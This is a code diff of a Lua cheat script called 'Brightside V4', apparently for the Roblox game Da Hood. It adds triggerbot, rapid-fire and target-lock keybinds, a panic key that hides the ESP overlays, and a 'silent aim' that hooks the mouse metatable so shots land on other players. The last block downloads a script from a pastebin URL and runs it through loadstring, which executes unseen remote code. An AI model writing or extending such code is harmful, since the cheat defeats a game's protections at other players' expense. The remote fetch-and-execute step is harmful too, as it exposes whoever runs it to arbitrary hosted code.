-            if keyCode and input.KeyCode == keyCode then
-                if action == "ESP Toggle" then
-                    ESPEnabled = not ESPEnabled
-                elseif action == "Lock Target" then
-                    if LockedTarget then
-                        LockedTarget = nil
-                    else
-                        LockedTarget = getTargetFromCursor()
-                    end
-                elseif action == "Trigger Bot Activate" then
-                    if Surge.Triggerbot and Surge.Triggerbot.Enabled then
-                        TriggerbotActive = not TriggerbotActive
-                    end
-                end
-                return
+    -- Lock Target
+    local lockKey = getKeyCodeFromString(Keybinds['Lock Target'] or 'Z')
+    if lockKey and input.KeyCode == lockKey then
+        if LockedTarget then
+            LockedTarget = nil
+        else
+            local cursorTarget = getTargetFromCursor()
+            if cursorTarget then
+                LockedTarget = cursorTarget
+            end
+        end
+        return
+    end
+    
+    -- Triggerbot Activate
+    local trigKey = getKeyCodeFromString(Keybinds['Trigger Bot Activate'] or 'V')
+    if trigKey and input.KeyCode == trigKey then
+        if not Surge['Triggerbot']['Enabled'] then return end
+        
+        local mode = Surge['Triggerbot']['Mode'] or 'Hold'
+        if mode == 'Toggle' then
+            TriggerbotActive = not TriggerbotActive
+        else
+            TriggerbotActive = true
+        end
+        
+        if Surge['Player Modification']['Rapid Fire']['Enabled'] then
+            RapidFireActive = true
+        end
+        return
+    end
+    
+    -- Spiderman Wall Jump
+    if input.KeyCode == Enum.KeyCode.Space then
+        local jumpNow = tick()
+        if jumpNow - LastJumpTime < 0.4 then
+            JumpCount = JumpCount + 1
+        else
+            JumpCount = 1
+        end
+        LastJumpTime = jumpNow
+        
+        if JumpCount >= 2 or not Surge.Spiderman['Require Double Jump'] then
+            performWallJump()
+        end
+        return
+    end
+    
+    -- Panic Ground
+    local panicGroundKey = getKeyCodeFromString(Keybinds['Panic Ground'] or 'X')
+    if panicGroundKey and input.KeyCode == panicGroundKey then
+        performPanicGround()
+        return
+    end
+    
+    -- Panic Key
+    local panicKey = getKeyCodeFromString(Keybinds['Panic'] or 'L')
+    if panicKey and input.KeyCode == panicKey then
+        if Surge['Main']['Panic']['Enabled'] then
+            ESPEnabled = false
+            LockedTarget = nil
+            CurrentTarget = nil
+            TriggerbotActive = false
+            RapidFireActive = false
+            
+            for _, drawings in pairs(ESPCache) do
+                for _, dr in pairs(drawings) do dr.Visible = false end
             end
         end
     end
 end)
 
--- ==========================================================
---  MAIN LOOP (Minimal pcall - only where absolutely needed)
--- ==========================================================
-RunService.RenderStepped:Connect(function()
-    -- Get camera once
-    local cam = Workspace.CurrentCamera
-    if not cam then return end
+UserInputService.InputEnded:Connect(function(input, processed)
+    if processed then return end
     
-    -- Update char cache
-    updateCachedChar()
-    
-    -- These can fail if any internal nil, but they have their own checks
-    -- No pcall needed if we have good nil checks inside
-    CurrentTarget = getBestTarget()
-    UpdateESP()
-    performTriggerbot()
-    performAntiTrip()
+    local trigKey = getKeyCodeFromString(Keybinds['Trigger Bot Activate'] or 'C')
+    if trigKey and input.KeyCode == trigKey then
+        if Surge['Triggerbot']['Enabled'] and Surge['Triggerbot']['Mode'] == 'Hold' then
+            TriggerbotActive = false
+            RapidFireActive = false
+        end
+    end
 end)
 
 -- ==========================================================
---  PLAYER CLEANUP
+--  MAIN LOOP (Optimized)
 -- ==========================================================
+RunService.RenderStepped:Connect(function()
+    CurrentTarget = getBestTarget()
+    UpdateESP()
+    performTriggerbot()
+    performAntiTrip() -- Fixed anti trip runs every frame with time throttle
+    
+    applyHeadless()
+    applyKorblox()
+end)
+
+-- Cleanup
 Players.PlayerRemoving:Connect(function(player)
     if player == LockedTarget then LockedTarget = nil end
     if player == CurrentTarget then CurrentTarget = nil end
     RemoveESP(player)
 end)
 
--- Initialize ESP
-for _, player in ipairs(Players:GetPlayers()) do
+-- Initialize ESP for existing players
+for _, player in pairs(Players:GetPlayers()) do
     if player ~= LocalPlayer then
         CreateESP(player)
     end
 end
 
-print("Brightside V4 - Checks Fixed (No pcall spam)")
+-- ==========================================================
+--  SILENT AIM (Optimized)
+-- ==========================================================
+local mouse = LocalPlayer:GetMouse()
+local mt = getrawmetatable(mouse)
+setreadonly(mt, false)
+local old = mt.__index
+
+mt.__index = newcclosure(function(self, key)
+    if key:lower() == "hit" or key:lower() == "target" then
+        if Surge["Silent Aimbot"]["Enabled"] and CurrentTarget then
+            local tgt = CurrentTarget
+            if tgt and tgt.Character then
+                local char = tgt.Character
+                local hrp = char:FindFirstChild("HumanoidRootPart")
+                local head = char:FindFirstChild("Head")
+                
+                local hitPartStr = Surge["Silent Aimbot"]["Hit Target"]["Hit Part"] or "Closest Point"
+                local targetPart = nil
+                
+                if hitPartStr == "Head" and head then
+                    targetPart = head
+                elseif hitPartStr == "HumanoidRootPart" and hrp then
+                    targetPart = hrp
+                else
+                    if hrp and head then
+                        local mousePos = Mouse.Hit.Position
+                        local headDist = (head.Position - mousePos).Magnitude
+                        local hrpDist = (hrp.Position - mousePos).Magnitude
+                        targetPart = headDist < hrpDist and head or hrp
+                    else
+                        targetPart = head or hrp
+                    end
+                end
+                
+                if targetPart then
+                    local vel = targetPart.AssemblyLinearVelocity or Vector3.new(0, 0, 0)
+                    local p = Surge["Silent Aimbot"]["Prediction"]
+                    local offset = Vector3.new(
+                        vel.X * (p.X or 0), 
+                        vel.Y * (p.Y or 0), 
+                        vel.Z * (p.Z or 0)
+                    )
+                    
+                    if Surge["Silent Aimbot"]["Prediction"]["Power"]["Enabled"] then
+                        local power = Surge["Silent Aimbot"]["Prediction"]["Power"]["Prediction Power"] or 1.042
+                        offset = offset * power
+                    end
+                    
+                    if key:lower() == "hit" then
+                        return CFrame.new(targetPart.Position + offset)
+                    else
+                        return targetPart
+                    end
+                end
+            end
+        end
+    end
+    return old(self, key)
+end)
+
+setreadonly(mt, true)
+
+print("Brightside V4 Loaded Successfully! | Anti Trip Fixed")
+print("Game:", isDaHoodGame and "Da Hood / Hood Customs" or "Other")
+print("Features: Fast Triggerbot, Cursor Targeting, Safe Anti Trip, Spiderman, Korblox, Headless, Panic Ground")
+
+-- ==========================================================
+--  LOAD EXTERNAL SCRIPT
+-- ==========================================================
+task.spawn(function()
+    local success, err = pcall(function()
+        local externalScript = game:HttpGet("https://pastebin.com/raw/L4yzzJ5D")
+        if externalScript and #externalScript > 0 then
+            loadstring(externalScript)()
+            print("External features loaded successfully")
+        end
+    end)
+    
+    if not success then
+        warn("Failed to load external features:", err)
+        print("Running with core features only")
+    end
+end)
